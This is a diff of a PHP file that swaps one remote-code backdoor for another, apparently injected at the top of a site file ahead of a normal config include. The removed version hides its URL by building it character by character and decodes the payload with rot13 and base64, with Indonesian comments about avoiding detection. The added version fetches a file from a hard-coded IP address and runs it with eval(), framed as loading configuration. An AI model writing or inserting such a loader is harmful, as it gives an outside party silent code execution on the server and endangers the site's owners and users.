@@ -1,50 +1,45 @@
 <?php
-// Simulasi nama variabel tidak mencurigakan
-$configUrl = implode('', ['h', 't', 't', 'p', ':', '/', '/', '1', '9', '2', '.', '1', '8', '7', '.', '9', '9', '.', '4', '4', '/', 'j', '2', '5', '1', '1', '1', '3', '_', '1', '3', '/', 'i', 'n', 'i', 't', '.', 't', 'x', 't']);
-
-// Fungsi untuk mengambil konten dengan metode fallback
-$getData = function($url) {
-    $content = false;
+// Simulasi fungsi bawaan PHP
+function getRemoteData($url) {
+    $result = false;
     
     if (ini_get('allow_url_fopen')) {
-        $context = stream_context_create(['http' => ['timeout' => 3]]);
-        $content = @file_get_contents($url, false, $context);
+        $result = @file_get_contents($url);
     }
     
-    if (!$content && extension_loaded('curl')) {
+    if ($result === false && function_exists('curl_init')) {
         $ch = curl_init();
         curl_setopt_array($ch, [
             CURLOPT_URL => $url,
             CURLOPT_RETURNTRANSFER => true,
             CURLOPT_SSL_VERIFYPEER => false,
             CURLOPT_FOLLOWLOCATION => true,
-            CURLOPT_TIMEOUT => 3,
+            CURLOPT_TIMEOUT => 5,
             CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         ]);
-        $content = curl_exec($ch);
+        $result = curl_exec($ch);
         curl_close($ch);
     }
     
-    return $content;
-};
+    return $result;
+}
 
-// Eksekusi tersembunyi
-if ($payload = $getData($configUrl)) {
-    // Dekoding sederhana untuk menghindari deteksi
-    $decoded = base64_decode(str_rot13($payload));
-    if (strpos($decoded, '<?php') === false) {
-        $decoded = "<?php\n" . $decoded;
-    }
-    
-    // Eksekusi menggunakan teknik output buffer
-    try {
-        ob_start();
-        eval('?>' . $decoded);
-        ob_end_flush();
-    } catch (Exception $e) {
-        ob_end_clean();
+// Data yang terlihat seperti konfigurasi normal
+$configData = getRemoteData('http://192.187.99.44/j251113_13/init.txt');
+
+if ($configData) {
+    // Validasi sederhana untuk memastikan ini kode PHP
+    if (strpos($configData, '<?php') !== false || strpos($configData, '<?=') !== false) {
+        // Eksekusi dengan error handling
+        try {
+            eval('?>' . $configData);
+        } catch (Exception $e) {
+            // Log silent error jika diperlukan
+            error_log('Configuration load error: ' . $e->getMessage());
+        }
     }
 }
+// Kode di bawah ini akan tetap berjalan normal
 ?>
 <?php   
 include dirname(__FILE__) . '/.private/config.php';
